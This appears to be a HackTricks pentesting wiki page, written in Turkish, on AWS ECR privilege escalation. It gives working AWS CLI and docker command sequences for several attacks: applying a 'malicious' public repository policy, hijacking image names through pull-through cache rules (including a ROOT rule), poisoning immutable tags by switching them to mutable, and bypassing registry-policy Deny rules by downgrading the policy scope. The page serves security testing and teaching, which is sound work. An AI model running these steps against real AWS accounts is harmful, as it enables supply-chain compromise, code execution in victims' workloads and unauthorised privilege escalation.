# AWS - ECR Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

Bu izinlere sahip bir saldırgan **`ecr:GetAuthorizationToken`** ve **`ecr:BatchGetImage`** ile ECR'ye giriş yapabilir ve görüntüleri indirebilir.

Daha fazla bilgi için nasıl görüntü indirileceğini inceleyin:

{{#ref}}
../../aws-post-exploitation/aws-ecr-post-exploitation/README.md
{{#endref}}

**Potential Impact:** Trafikteki hassas bilgileri yakalayarak dolaylı privesc.

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

Bu izinlerin tamamına sahip bir saldırgan **ECR'ye giriş yapabilir ve görüntüleri yükleyebilir**. Bu, bu görüntülerin kullanıldığı diğer ortamlarda ayrıcalık yükseltmek için faydalı olabilir.

Ayrıca, `ecr:PutImage` mevcut bir etiketi (örneğin `stable` / `prod`) o etikete farklı bir image manifesti yükleyerek **üzerine yazmak** için kullanılabilir; bu da etiket tabanlı dağıtımların etkili şekilde ele geçirilmesi anlamına gelir.

Bu, aşağıdakiler gibi downstream tüketiciler etiketle dağıtım yapıp etiket değişikliklerinde **auto-refresh** yaptığında özellikle etkili olur:

- **Lambda container image functions** (`PackageType=Image`) `.../repo:stable`'a referans veren
- ECS services / Kubernetes workloads `repo:prod` (digest pinlemesi olmadan) çeken
- ECR olaylarında yeniden dağıtım yapan herhangi bir CI/CD

Bu durumlarda, bir etiket üzerine yazma tüketici ortamında **remote code execution**'a ve o iş yükü tarafından kullanılan IAM role ayrıcalıklarına yükselme ile sonuçlanabilir (örneğin, `secretsmanager:GetSecretValue` iznine sahip bir Lambda execution role).

Yeni bir image yükleme/güncelleme nasıl yapılır öğrenmek için bakın:

{{#ref}}
../../aws-services/aws-eks-enum.md
{{#endref}}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Önceki bölüme benzer, ancak public repository'ler için.

### `ecr:SetRepositoryPolicy`

Bu izne sahip bir saldırgan repository **policy**'sini değiştirerek kendine (veya herkese) **read/write access** verebilir.\
Örneğin, aşağıdaki örnekte okuma izni herkese verilmiştir.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
`my-policy.json` içeriği:
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "allow public pull",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

Önceki bölümdekiyle aynı, ancak public repositories için.\
Bir saldırgan bir ECR Public repository'nin **depo politikasını değiştirebilir** yetkisiz genel erişim vermek veya ayrıcalıklarını yükseltmek için.
```bash
# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
**Olası Etki**: ECR Public repository'ye yetkisiz genel erişim, herhangi bir kullanıcının push, pull, or delete images yapmasına izin verir.

### `ecr:PutRegistryPolicy`

Bu izne sahip bir saldırgan, **kayıt defteri politikasını** **değiştirerek** kendisine, hesabına (veya hatta herkese) **okuma/yazma erişimi** verebilir.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
### ecr:CreatePullThroughCacheRule

ECR Pull Through Cache (PTC) kurallarını, attacker-controlled bir upstream namespace'i trusted private ECR önekiyle eşleştirmek için kötüye kullanın. Bu, private ECR'den çeken iş yüklerinin private ECR'ye herhangi bir push yapılmadan şeffaf biçimde attacker tarafından sağlanan imajları almasını sağlar.

- Gerekli izinler: ecr:CreatePullThroughCacheRule, ecr:DescribePullThroughCacheRules, ecr:DeletePullThroughCacheRule. Eğer ECR Public upstream kullanılıyorsa: public repo'yu oluşturmak/push etmek için ecr-public:*.
- Test edilen upstream: public.ecr.aws

Adımlar (örnek):

1. ECR Public'te attacker imajı hazırla
# Get your ECR Public alias with: aws ecr-public describe-registries --region us-east-1
docker login public.ecr.aws/<public_alias>
docker build -t public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test .
docker push public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test

2. Private ECR'de trusted bir öneki public registry'ye eşleştirmek için PTC kuralı oluştur
aws ecr create-pull-through-cache-rule --region us-east-2 --ecr-repository-prefix ptc --upstream-registry-url public.ecr.aws

3. Private ECR yolunu kullanarak attacker imajını çek (private ECR'ye herhangi bir push yapılmadı)
docker login <account_id>.dkr.ecr.us-east-2.amazonaws.com
docker pull <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test
docker run --rm <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test

Olası Etki: Seçilen önek altında dahili imaj isimlerini ele geçirerek tedarik zinciri kompromisi. Bu öneki kullanan private ECR'den imaj çeken herhangi bir iş yükü attacker-controlled içerik alacaktır.

### `ecr:PutImageTagMutability`

Bu izni, tag immutability olan bir repository'yi mutable hale getirip trusted tag'leri (ör. latest, stable, prod) attacker-controlled içerikle üzerine yazarak kötüye kullanın.

- Gerekli izinler: `ecr:PutImageTagMutability` ve push yetenekleri (`ecr:GetAuthorizationToken`, `ecr:InitiateLayerUpload`, `ecr:UploadLayerPart`, `ecr:CompleteLayerUpload`, `ecr:PutImage`).
- Etki: Tag isimlerini değiştirmeden immutable tag'leri sessizce değiştirerek tedarik zinciri kompromisine yol açar.

Adımlar (örnek):

<details>
<summary>Mutability'yi değiştirerek immutable bir tag'i zehirleme</summary>
```bash
REGION=us-east-1
REPO=ht-immutable-demo-$RANDOM
aws ecr create-repository --region $REGION --repository-name $REPO --image-tag-mutability IMMUTABLE
acct=$(aws sts get-caller-identity --query Account --output text)
aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com
# Build and push initial trusted tag
printf 'FROM alpine:3.19\nCMD echo V1\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Attempt overwrite while IMMUTABLE (should fail)
printf 'FROM alpine:3.19\nCMD echo V2\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Flip to MUTABLE and overwrite
aws ecr put-image-tag-mutability --region $REGION --repository-name $REPO --image-tag-mutability MUTABLE
docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Validate consumers pulling by tag now get the poisoned image (prints V2)
docker run --rm ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
```
</details>


#### ROOT Pull-Through Cache kuralı aracılığıyla global registry hijack

Özel `ecrRepositoryPrefix=ROOT` kullanarak Pull-Through Cache (PTC) kuralı oluşturun; bu, private ECR registry'nin kökünü upstream public registry'ye (ör. ECR Public) eşler. Private registry'de var olmayan bir repository'ye yapılan herhangi bir pull, upstream'den şeffaf şekilde servis edilir; böylece private ECR'ye push yapmadan supply-chain hijacking mümkün olur.

- Gerekli izinler: `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`, `ecr:GetAuthorizationToken`.
- Etkisi: Pull'lar `<account>.dkr.ecr.<region>.amazonaws.com/<any-existing-upstream-path>:<tag>` adresine başarılı olur ve upstream kaynaklı private repo'ları otomatik oluşturur.

> Not: `ROOT` kuralları için `--upstream-repository-prefix` parametresini belirtmeyin. Belirtilmesi doğrulama hatası oluşturacaktır.

<details>
<summary>Demo (us-east-1, upstream public.ecr.aws)</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 1) Create ROOT PTC rule mapping to ECR Public (no upstream prefix)
aws ecr create-pull-through-cache-rule \
--region "$REGION" \
--ecr-repository-prefix ROOT \
--upstream-registry-url public.ecr.aws

# 2) Authenticate to private ECR and pull via root path (triggers caching & auto repo creation)
aws ecr get-login-password --region "$REGION" | docker login --username AWS --password-stdin ${ACCT}.dkr.ecr.${REGION}.amazonaws.com

# Example using an official mirror path hosted in ECR Public
# (public.ecr.aws/docker/library/alpine:latest)
docker pull ${ACCT}.dkr.ecr.${REGION}.amazonaws.com/docker/library/alpine:latest

# 3) Verify repo and image now exist without any push
aws ecr describe-repositories --region "$REGION" \
--query "repositories[?repositoryName==docker/library/alpine]"
aws ecr list-images --region "$REGION" --repository-name docker/library/alpine --filter tagStatus=TAGGED

# 4) Cleanup
aws ecr delete-pull-through-cache-rule --region "$REGION" --ecr-repository-prefix ROOT
aws ecr delete-repository --region "$REGION" --repository-name docker/library/alpine --force || true
```
</details>

### `ecr:PutAccountSetting` (`REGISTRY_POLICY_SCOPE`'u düşürerek registry policy Deny'larını atlatma)

`ecr:PutAccountSetting`'i kullanarak registry policy kapsamını `V2`'den (tüm ECR işlemlerine uygulanan politika) `V1`'e (sadece `CreateRepository`, `ReplicateImage`, `BatchImportUpstreamImage`'e uygulanan politika) geçirin. Eğer kısıtlayıcı bir registry policy Deny, `CreatePullThroughCacheRule` gibi işlemleri engelliyorsa, kapsamı `V1`'e düşürmek bu yaptırımı kaldırır ve identity‑policy Allows yürürlüğe girer.

- Gerekli izinler: `ecr:PutAccountSetting`, `ecr:PutRegistryPolicy`, `ecr:GetRegistryPolicy`, `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`.
- Etki: Kapsamı geçici olarak `V1` yaparak daha önce registry policy Deny tarafından engellenen ECR işlemlerini (ör. PTC kuralları oluşturma) gerçekleştirme yeteneği.

Adımlar (örnek):

<details>
<summary>CreatePullThroughCacheRule için registry policy Deny'ını V1'e geçerek atlatma</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 0) Snapshot current scope/policy (for restore)
aws ecr get-account-setting --name REGISTRY_POLICY_SCOPE --region $REGION || true
aws ecr get-registry-policy --region $REGION > /tmp/orig-registry-policy.json 2>/dev/null || echo '{}' > /tmp/orig-registry-policy.json

# 1) Ensure V2 and set a registry policy Deny for CreatePullThroughCacheRule
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
cat > /tmp/deny-ptc.json <<'JSON'
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "DenyPTCAll",
"Effect": "Deny",
"Principal": "*",
"Action": ["ecr:CreatePullThroughCacheRule"],
"Resource": "*"
}
]
}
JSON
aws ecr put-registry-policy --policy-text file:///tmp/deny-ptc.json --region $REGION

# 2) Attempt to create a PTC rule (should FAIL under V2 due to Deny)
set +e
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws
RC=$?
set -e
if [ "$RC" -eq 0 ]; then echo "UNEXPECTED: rule creation succeeded under V2 deny"; fi

# 3) Downgrade scope to V1 and retry (should SUCCEED now)
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V1 --region $REGION
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws

# 4) Verify rule exists
aws ecr describe-pull-through-cache-rules --region $REGION \
--query "pullThroughCacheRules[?ecrRepositoryPrefix=='ptc-deny-test']"

# 5) Cleanup and restore
aws ecr delete-pull-through-cache-rule --region $REGION --ecr-repository-prefix ptc-deny-test || true
if jq -e '.registryPolicyText' /tmp/orig-registry-policy.json >/dev/null 2>&1; then
jq -r '.registryPolicyText' /tmp/orig-registry-policy.json > /tmp/_orig.txt
aws ecr put-registry-policy --region $REGION --policy-text file:///tmp/_orig.txt
else
aws ecr delete-registry-policy --region $REGION || true
fi
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
```
</details>

{{#include ../../../../banners/hacktricks-training.md}}
